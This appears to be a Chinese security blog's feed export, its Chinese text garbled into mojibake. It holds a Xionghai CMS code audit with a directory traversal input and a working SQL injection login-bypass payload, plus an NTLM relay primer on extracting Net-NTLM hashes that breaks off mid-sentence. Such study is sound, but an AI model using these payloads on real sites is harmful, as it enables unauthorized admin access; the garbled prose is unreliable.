support</td></tr><tr><td>6.1</td><td>2018-03-11</td><td>Java 10 language support</td></tr><tr><td>7.0</td><td>2018-10-27</td><td><strong>Java 11 language support</strong></td></tr><tr><td>7.1</td><td>2019-03-03</td><td>Java 13 language support</td></tr><tr><td>8.0</td><td>2020-03-28</td><td>Java 14 language support</td></tr><tr><td>9.0</td><td>2020-09-22</td><td>Java 16 language support</td></tr><tr><td>9.1</td><td>2021-02-06</td><td><strong>JDK 17 support</strong></td></tr><tr><td>9.2</td><td>2021-06-26</td><td>JDK 18 support</td></tr><tr><td>9.3</td><td>2022-04-04</td><td></td></tr><tr><td>9.4</td><td>2022-10-02</td><td></td></tr><tr><td>9.5</td><td>2023-03-24</td><td></td></tr></tbody></table><h2 id="asmèƒ½åšçš„äº‹"><a href="#ASMèƒ½åšçš„äº‹" class="headerlink" title="ASMèƒ½åšçš„äº‹"></a>ASMèƒ½åšçš„äº‹</h2><ul><li>çˆ¶ç±»ï¼šä¿®æ”¹æˆä¸€ä¸ªæ–°çš„çˆ¶ç±»</li><li>æ¥å£ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ¥å£ã€åˆ é™¤å·²æœ‰çš„æ¥å£</li><li>å­—æ®µï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„å­—æ®µã€åˆ é™¤å·²æœ‰çš„å­—æ®µ</li><li>æ–¹æ³•ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–¹æ³•ã€åˆ é™¤å·²æœ‰çš„æ–¹æ³•ã€ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•</li><li>â€¦ç­‰ç­‰</li></ul><h1 id="asmç”Ÿæˆæ–°çš„ç±»"><a href="#ASMç”Ÿæˆæ–°çš„ç±»" class="headerlink" title="ASMç”Ÿæˆæ–°çš„ç±»"></a>ASMç”Ÿæˆæ–°çš„ç±»</h1>]]></content>
      
      
      <categories>
          
          <category> javaåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç†Šæµ·cmsä»£ç å®¡è®¡</title>
      <link href="/2024/05/21/%E7%86%8A%E6%B5%B7cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/05/21/%E7%86%8A%E6%B5%B7cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒå®‰è£…"><a href="#ç¯å¢ƒå®‰è£…" class="headerlink" title="ç¯å¢ƒå®‰è£…"></a>ç¯å¢ƒå®‰è£…</h1><p>æ¥å®¡ä¸€ä¸‹è¿™ä¸ªç®€å•cmså­¦ä¹ ä¸€ä¸‹ï¼Œç†Šæµ·cmsç›´æ¥ç½‘ä¸Šæ‰¾å°±å¯ä»¥</p><p>é‡‡ç”¨phpstudyè¿›è¡Œé…ç½®ï¼Œç„¶åè¦æå‰å»ºç«‹ä¸€ä¸ªæ•°æ®ï¼Œä»–ä¸ä¼šè‡ªåŠ¨å¸®ä½ å»º</p><p>å®‰è£…å¥½åé¦–é¡µå°±æ˜¯è¿™æ ·çš„</p><p><img src="http://cdn.clown2024.cn/202407151712203.png" alt="image-20240521001351083"></p><h1 id="å¼€å§‹å®¡è®¡"><a href="#å¼€å§‹å®¡è®¡" class="headerlink" title="å¼€å§‹å®¡è®¡"></a>å¼€å§‹å®¡è®¡</h1><h2 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h2><p><img src="http://cdn.clown2024.cn/202407151712204.png" alt="image-20240523235111948"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">admin         --ç®¡ç†åå°æ–‡ä»¶å¤¹<br>css           --å­˜æ”¾cssçš„æ–‡ä»¶å¤¹<br>files         --å­˜æ”¾é¡µé¢çš„æ–‡ä»¶å¤¹<br>images        --å­˜æ”¾å›¾ç‰‡çš„æ–‡ä»¶å¤¹<br>inc           --å­˜æ”¾ç½‘ç«™é…ç½®æ–‡ä»¶çš„æ–‡ä»¶å¤¹<br>install       --ç½‘ç«™è¿›è¡Œå®‰è£…çš„æ–‡ä»¶å¤¹<br>seacmseditor  --ç¼–è¾‘å™¨æ–‡ä»¶å¤¹<br>template      --æ¨¡æ¿æ–‡ä»¶å¤¹<br>upload        --ä¸Šä¼ åŠŸèƒ½æ–‡ä»¶å¤¹<br>index.php     --ç½‘ç«™é¦–é¡µ<br></code></pre></td></tr></table></figure><p>å…ˆç›´æ¥æ”¾è¿›seayé‡Œé¢æ‰«ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151712205.png" alt="image-20240523235351518"></p><p>çœ‹èµ·æ¥è¿˜è›®å°‘çš„ï¼Œé‚£å°±ç›´æ¥é’ˆå¯¹æ¯ä¸ªæ¼æ´ç±»å‹å»çœ‹çœ‹</p><h2 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h2><p><strong>ç¬¬ä¸€å¤„æ–‡ä»¶åŒ…å«</strong></p><p>æ ¹ç›®å½•ä¸‹çš„index.phpæºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//å•ä¸€å…¥å£æ¨¡å¼</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//å…³é—­é”™è¯¯æ˜¾ç¤º</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//æ¥æ”¶æ–‡ä»¶å</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindex</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//è½½å…¥ç›¸åº”æ–‡ä»¶</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„æ–‡ä»¶åŒ…å«ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œæˆ‘åœ¨ç½‘ç«™ä¸Šçº§ç›®å½•æ”¾äº†flag.phpç”¨æ¥æµ‹è¯•ï¼Œrä¸ºç©ºå°±ä¼šåŒ…å«filesç›®å½•ä¸‹çš„indexï¼Œç»™rä¼ ä¸€ä¸ª..&#x2F;..&#x2F;flagå³å¯ç›®å½•ç©¿è¶Š</p><p><img src="http://cdn.clown2024.cn/202407151712206.png" alt="image-20240524000419879"></p><p>èƒ½é…åˆæ–‡ä»¶ä¸Šä¼ å°±èƒ½å¤Ÿå‘æŒ¥å¤§ç”¨å¤„ï¼Œç›®å‰æš‚æ—¶è¯»è¯»æ–‡ä»¶åªèƒ½</p><p>addslashesæ˜¯ç”¨æ¥è½¬ä¹‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„</p><p><img src="http://cdn.clown2024.cn/202407151712207.png" alt="image-20240524000753569"></p><p><strong>ç¬¬äºŒå¤„æ–‡ä»¶åŒ…å«</strong></p><p>ç¬¬äºŒå¤„åœ¨&#x2F;admin&#x2F;index.phpå¤„</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//å•ä¸€å…¥å£æ¨¡å¼</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//å…³é—­é”™è¯¯æ˜¾ç¤º</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//æ¥æ”¶æ–‡ä»¶å</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindex</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//è½½å…¥ç›¸åº”æ–‡ä»¶</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¯¥é¡µé¢é»˜è®¤ä¼šåŠ ä¸Šloginå‚æ•°</p><p><img src="http://cdn.clown2024.cn/202407151712208.png" alt="image-20240524001055974"></p><p>ä¸€æ ·çš„ç›®å½•ç©¿è¶Šæ¼æ´</p><p><img src="http://cdn.clown2024.cn/202407151712209.png" alt="image-20240524001024759"></p><h2 id="sqlæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><p>admin&#x2F;filesä¸‹é¢çš„é¡µé¢å°±æŠ¥äº†å¾ˆå¤šsqlçš„æ¼æ´</p><p>ä½†æ˜¯æˆ‘æƒ³å…ˆå»çœ‹ä¸€ä¸‹loginé¡µé¢ï¼Œå› ä¸ºå¾ˆå¤šæ¼æ´éƒ½æ˜¯åå°é¡µé¢ï¼Œç™»é™†éƒ½ç»•è¿‡ä¸è¿‡å»æ€ä¹ˆè¿›åå°åˆ©ç”¨å‘¢ï¼Œè€Œä¸”è¿™ä¸ªcmsåº”è¯¥æ²¡æœ‰é¢„ç¼–è¯‘ä¹ æƒ¯ï¼Œloginé¡µé¢çš„sqlåº”è¯¥ä¹Ÿæ˜¯æœ‰æ¼æ´ï¼Œæˆ‘å°±å»çœ‹äº†ä¸€ä¸‹ï¼Œè¿˜çœŸæœ‰</p><p><strong>admin&#x2F;files&#x2F;login.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;../inc/conn.php&#x27;</span>;<br><span class="hljs-variable">$login</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>];<br><span class="hljs-variable">$user</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$checkbox</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checkbox&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$login</span>&lt;&gt;<span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="hljs-subst">$user</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-variable">$users</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)) &#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$passwords</span>=<span class="hljs-variable">$users</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)&lt;&gt;<span class="hljs-variable">$passwords</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-comment">//å†™å…¥ç™»å½•ä¿¡æ¯å¹¶è®°ä½30å¤©</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$checkbox</span>==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-variable">$user</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-variable">$user</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;this.location=&#x27;?r=index&#x27;&lt;/script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è¿™é‡Œæ²¡æœ‰è½¬ä¹‰é‚£å°±è‚¯å®šæœ‰sqlæ³¨å…¥äº†ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä»–çš„æ ¡éªŒé€»è¾‘ï¼ŒæŸ¥è¯¢æŒ‡å®šç”¨æˆ·ç„¶åä»æ•°æ®åº“ä¸­è·å–ä»–çš„å¯†ç ï¼Œä¸æˆ‘ä»¬çš„å¯†ç md5ä¹‹åè¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸ç­‰åˆ™ç™»é™†æˆåŠŸ</p><p>é‚£è¿™é‡Œæˆ‘å°±é‡‡ç”¨äº†è”åˆæ³¨å…¥ï¼Œç„¶åè¾“å…¥å¯†ç ä¸º1ï¼ŒæŸ¥è¯¢çš„å€¼ä¸º1çš„md5ï¼Œæœ€ç»ˆæˆåŠŸç»•è¿‡</p><blockquote><p>ä¸è¿‡å­—æ®µæ•°éœ€è¦å°è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œè¯•å‡ºæ¥æ˜¯æœ‰8ä¸ª</p></blockquote><p>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user=-1&#x27; union select 1,1,1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot;,1,1,1,1#&amp;password=1&amp;checkbox=1&amp;login=yes<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151712210.png" alt="image-20240524003328983"></p><p>è€Œä¸”èº«ä»½ç«Ÿç„¶æ˜¯adminï¼Œè¿™é‡Œè¿˜æ²¡çœ‹å‡ºä¸ºä»€ä¹ˆçªç„¶å°±adminäº†ï¼Œæºç å¥½åƒæ²¡çœ‹åˆ°ç›¸å…³çš„</p><p><img src="http://cdn.clown2024.cn/202407151712211.png" alt="image-20240524003529583"></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾-NTLMä¸­ç»§ä¸“é¢˜</title>
      <link href="/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-NTLM%E4%B8%AD%E7%BB%A7%E4%B8%93%E9%A2%98/"/>
      <url>/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-NTLM%E4%B8%AD%E7%BB%A7%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="ntlmåè®®"><a href="#NTLMåè®®" class="headerlink" title="NTLMåè®®"></a>NTLMåè®®</h1><p>NTLM(NT LAN Manager)æ˜¯ä¸€å¥— Windows å®‰å…¨åè®®ï¼Œæ—¨åœ¨ä¸ºç”¨æˆ·æä¾›å…·æœ‰å®Œæ•´æ€§å’Œæœºå¯†æ€§çš„èº«ä»½éªŒè¯ã€‚</p><p>NTLM æ˜¯åŸºäºè´¨è¯¢&#x2F;åº”ç­”æ¨¡å¼çš„èº«ä»½éªŒè¯åè®®ï¼Œå…¶è¿‡ç¨‹æ˜¯åŠ å¯†çš„ï¼ŒéªŒè¯è¿‡ç¨‹ä¸­ä¸ä¼šé€šè¿‡ç½‘ç»œä¼ è¾“ç”¨æˆ·çš„æ˜æ–‡å¯†ç ã€‚</p><p>NTLMéªŒè¯çš„åŠ å¯†ç®—æ³•ä¸ºNTLM Hashï¼Œç”¨äºç”¨æˆ·æ˜æ–‡å¯†ç çš„åŠ å¯†ï¼Œå…¶è®¡ç®—çš„å“ˆå¸Œå€¼å­˜å‚¨åœ¨æœ¬åœ°çš„SAMæ–‡ä»¶ä¸­ï¼ŒåŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œå€¼å­˜å‚¨åœ¨åŸŸæ§çš„NTDS.ditæ–‡ä»¶ä¸­ã€‚</p><p>æœ¬åœ°ç”¨æˆ·ç™»å½•éªŒè¯æ—¶ï¼Œå°±æ˜¯å°†è¾“å…¥çš„å¯†ç è½¬åŒ–ä¸ºNTLM Hashç„¶åä¸SAMæ–‡ä»¶ä¸­çš„NTLM Hashæ¯”è¾ƒã€‚</p><p>æ–‡ä»¶ä¸­å­˜å‚¨çš„å“ˆå¸Œå€¼æ ¼å¼ç±»ä¼¼å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151446349.png" alt="image-20240517104232456"></p><p>ä¸Šå›¾æœ‰ä¸¤ä¸ªå“ˆå¸Œï¼Œç¬¬ä¸€ä¸ªæ˜¯LM Hashï¼Œç¬¬äºŒä¸ªæ˜¯NTLM Hashã€‚</p><p>LM Hash æ˜¯ LM(LAN Manager)éªŒè¯æœºåˆ¶çš„åŠ å¯†ç®—æ³•ã€‚LM æ˜¯åœ¨ NTLM å‡ºç°ä¹‹å‰Windows ä½¿ç”¨çš„éªŒè¯æœºåˆ¶ã€‚LM è‡ªèº«å­˜åœ¨çš„ç¼ºé™·ä½¿å¾—LM Hash åŠ å¯†å¼ºåº¦ä¸é«˜ï¼Œä»¥è‡³å¾ˆå®¹æ˜“è¢«ç ´è§£ï¼Œæ‰€ä»¥ LM é€æ¸è¢« NTLM æ‰€æ·˜æ±°ã€‚NTLMæœ‰ NTLM v1ã€NTLM v2ã€NTLM v2Session ä¸‰ä¸ªç‰ˆæœ¬ï¼Œç›®å‰ä½¿ç”¨æœ€å¤šçš„æ˜¯ NTLM v2 ç‰ˆæœ¬ã€‚</p><h1 id="ntlmè®¤è¯æœºåˆ¶"><a href="#NTLMè®¤è¯æœºåˆ¶" class="headerlink" title="NTLMè®¤è¯æœºåˆ¶"></a>NTLMè®¤è¯æœºåˆ¶</h1><h2 id="ntlmåœ¨å·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯"><a href="#NTLMåœ¨å·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯" class="headerlink" title="NTLMåœ¨å·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯"></a>NTLMåœ¨å·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯</h2><p>NTLMé‡‡ç”¨äº†ä¸€ç§ä¸€ç§åŸºäºè´¨è¯¢&#x2F;åº”ç­”æ¨¡å¼çš„èº«ä»½éªŒè¯æœºåˆ¶ï¼Œè®¤è¯è¿‡ç¨‹ä¼šäº§ç”Ÿä¸‰ç§ç±»å‹çš„æ¶ˆæ¯ï¼š</p><p>TYPE1ï¼Œåå•†(Negotiate);TYPE 2ï¼Œè´¨è¯¢(Challenge);TYPE 3ï¼Œèº«ä»½éªŒè¯(Authenticate)</p><p><img src="http://cdn.clown2024.cn/202407151446350.png" alt="image-20240517103005341"></p><p>å…·ä½“è¿‡ç¨‹ï¼š</p><ol><li>å½“å®¢æˆ·ç«¯è¦è®¿é—®æœåŠ¡å™¨ä¸ŠæŸä¸ªå—ä¿æŠ¤çš„æœåŠ¡æ—¶ï¼Œéœ€è¦è¾“å…¥æœåŠ¡å™¨çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ã€‚æ­¤æ—¶å®¢æˆ·ç«¯ä¼šåœ¨æœ¬åœ°ç¼“å­˜ä¸€ä»½æœåŠ¡å™¨å¯†ç çš„ NTLM Hashï¼Œç„¶åå‘æœåŠ¡å™¨å‘é€TYPE1Negotiate æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯ä¸­åŒ…å«ä¸€ä¸ªä»¥æ˜æ–‡è¡¨ç¤ºçš„ç”¨æˆ·åä»¥åŠå…¶ä»–åå•†ä¿¡æ¯ï¼Œå¦‚éœ€è¦è®¤è¯çš„ä¸»ä½“å’Œéœ€è¦ä½¿ç”¨çš„æœåŠ¡ç­‰ã€‚</li><li>æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„ TYPE1æ¶ˆæ¯åï¼Œå…ˆåˆ¤æ–­æœ¬åœ°è´¦æˆ·ä¸­æ˜¯å¦æœ‰ TYPE1æ¶ˆæ¯ä¸­çš„ç”¨æˆ·åã€‚å¦‚æœæœ‰,æœåŠ¡å™¨å°±ä¼šé€‰å‡ºè‡ªå·±èƒ½å¤Ÿæ”¯æŒå’Œæä¾›çš„æœåŠ¡å†…å®¹,ç”Ÿæˆå¹¶å›å¤ TYPE2 Challenge æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯ä¸­åŒ…å«äº†ä¸€ä¸ªç”±æœåŠ¡ç«¯ç”Ÿæˆçš„ 16 ä½éšæœºå€¼ Challengeï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šåœ¨æœ¬åœ°ç¼“å­˜è¯¥å€¼ã€‚</li><li>å®¢æˆ·ç«¯æ”¶åˆ° TYPE 2æ¶ˆæ¯åï¼Œä¼šä½¿ç”¨æ­¥éª¤1ä¸­ç¼“å­˜çš„æœåŠ¡å™¨çš„ NTLM Hash å¯¹Challenge è¿›è¡ŒåŠ å¯†å¹¶ç”ŸæˆResponseï¼Œç„¶åå°†Responseã€ç”¨æˆ·åå’ŒChallenge ç­‰ç»„åˆå¾—åˆ° Net-NTLM Hashï¼Œå†å°† Net-NTLM Hash å°è£…åˆ° TYPE3 Authenticate æ¶ˆæ¯ä¸­å‘å¾€æœåŠ¡å™¨ã€‚</li><li>æœåŠ¡å™¨åœ¨æ”¶åˆ° TYPE3æ¶ˆæ¯å,ç”¨è‡ªå·±å¯†ç çš„NTLMHashå¯¹ Challenge è¿›è¡ŒåŠ å¯†å¹¶æ¯”è¾ƒè‡ªå·±è®¡ç®—çš„ Response ä¸å®¢æˆ·ç«¯å‘é€çš„ Response æ˜¯å¦ä¸€è‡´ã€‚å¦‚æœä¸€è‡´ï¼Œå°±è¯æ˜å®¢æˆ·ç«¯æŒæ¡äº†æœåŠ¡å™¨çš„å¯†ç ï¼Œè®¤è¯æˆåŠŸï¼Œå¦åˆ™è®¤è¯å¤±è´¥ã€‚</li></ol><h2 id="ntlmåœ¨åŸŸç¯å¢ƒçš„è®¤è¯"><a href="#NTLMåœ¨åŸŸç¯å¢ƒçš„è®¤è¯" class="headerlink" title="NTLMåœ¨åŸŸç¯å¢ƒçš„è®¤è¯"></a>NTLMåœ¨åŸŸç¯å¢ƒçš„è®¤è¯</h2><p>åŸŸç¯å¢ƒä¸­ï¼ŒåŸŸç”¨æˆ·çš„å“ˆå¸Œå€¼éƒ½å­˜å‚¨åœ¨åŸŸæ§çš„NTDS.ditä¸­ï¼ŒæœåŠ¡å™¨æœ¬èº«æ— æ³•è®¡ç®—Responseæ¶ˆæ¯ï¼Œå› æ­¤éœ€è¦å’ŒåŸŸæ§å»ºç«‹ä¸€ä¸ªå®‰å…¨é€šé“ï¼Œå¹¶é€šè¿‡åŸŸæ§å®Œæˆæœ€ç»ˆçš„è®¤è¯æµç¨‹ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151446351.png" alt="image-20240517141109345"></p><ol><li>åŸŸç”¨æˆ·è¾“å…¥è‡ªå·±çš„è´¦å·å¯†ç ç™»å½•å®¢æˆ·ç«¯ä¸»æœºæ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå°†ç”¨æˆ·è¾“å…¥çš„å¯†ç è½¬æ¢ä¸ºNTLM Hashç¼“å­˜ï¼Œå½“ç”¨æˆ·æƒ³è®¿é—®æŸå°æœåŠ¡å™¨çš„æœåŠ¡æ—¶ï¼Œå°±ä¼šå‘é€TYPE1 Negotiateæ¶ˆæ¯</li><li>åŒå·¥ä½œç»„ç¯å¢ƒä¸­çš„è®¤è¯</li><li>åŒå·¥ä½œç»„ç¯å¢ƒä¸­çš„è®¤è¯</li><li>æœåŠ¡å™¨æ”¶åˆ°TYPE3 æ¶ˆæ¯ä¹‹åä¼šè½¬å‘ç»™åŸŸæ§</li><li>åŸŸæ§æ ¹æ®TYPE3æ¶ˆæ¯è·å–å¯¹åº”ç”¨æˆ·çš„æœ¬åœ°å­˜å‚¨NTLM Hashï¼Œç„¶åå¯¹åŸå§‹Challengeè®¡ç®—ç”ŸæˆResponseï¼Œç„¶åå’ŒTYPE3æ¶ˆæ¯ä¸­çš„Responseæ¯”å¯¹</li><li>æœåŠ¡å™¨æ ¹æ®åŸŸæ§è¿”å›çš„éªŒè¯ç»“æœï¼Œå¯¹å®¢æˆ·ç«¯è¿›è¡Œå›å¤</li></ol><h2 id="net-ntlm-hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h2><h3 id="net-ntlm-hashç»„æˆ"><a href="#Net-NTLM-Hashç»„æˆ" class="headerlink" title="Net-NTLM Hashç»„æˆ"></a>Net-NTLM Hashç»„æˆ</h3><p>Net-NTLM Hashæ˜¯ä¸Šé¢TYPE3æ¶ˆæ¯ä¸­åŒ…å«çš„ï¼Œæ˜¯åœ¨ç½‘ç»œç¯å¢ƒä¸‹NTLMè®¤è¯çš„å“ˆå¸Œå€¼ã€‚åœ¨NTLM  v1å’ŒNTLM v2ä¸­ï¼ŒNet-NTLM Hashä¹Ÿå¯ä»¥åˆ†ä¸ºv1å’Œv2ä¸¤ä¸ªç‰ˆæœ¬ï¼Œæ„æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># Net-NTLM Hash v1<br>uername::hostname::LM response:NTLM response:challenge<br># Net-NTLM Hash v2<br>username::domain:challenge:HMAC-MD5:blob<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä»NTLMè®¤è¯çš„æ•°æ®åŒ…ä¸­æå–Net-NTLM Hashï¼Œä¸‹é¢æ˜¯Net-NTLM Hash v2çš„æå–è¿‡ç¨‹</p><ol><li><p>ä»TYPE 2 æ¶ˆæ¯çš„æ•°æ®åŒ…ä¸­æå–å¾—åˆ°Challenge</p><p><img src="http://cdn.clown2024.cn/202407151446352.png" alt="image-20240517154219376"></p></li><li><p>HMAC-MD5å¯¹åº”TYPE3æ•°æ®åŒ…ä¸­çš„NTProofStr</p><p><img src="http://cdn.clown2024.cn/202407151446353.png" alt="image-20240517154324541"></p></li><li><p>User nameå’ŒDomainåœ¨TYPE3æ•°æ®åŒ…ä¸­éƒ½å¯ä»¥æ‰¾åˆ°ï¼Œblobä¸ºæ•°æ®åŒ…ä¸­çš„Responseå‡å»NTProofStråå‰©ä¸‹çš„éƒ¨åˆ†</p><p><img src="http://cdn.clown2024.cn/202407151446354.png" alt="image-20240517154720777"></p></li><li><p>å†æ ¹æ®Net-NTLM Hash v2çš„æ„æˆå°†ä¸Šé¢çš„æ•°æ®ç»„åˆèµ·æ¥å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151446355.png" alt="image-20240517154802759"></p></li></ol><h3 id="net-ntlm-hashåˆ©ç”¨"><a href="#Net-NTLM-Hashåˆ©ç”¨" class="headerlink" title="Net-NTLM Hashåˆ©ç”¨"></a>Net-NTLM Hashåˆ©ç”¨</h3><p>å®æˆ˜ä¸­å¯ä»¥é€šè¿‡ä¸­é—´äººçš„æ–¹æ³•æˆªè·è®¤è¯è¯·æ±‚è·å¾—Net-NTLM Hashï¼Œç„¶åå¯ä»¥æš´åŠ›ç 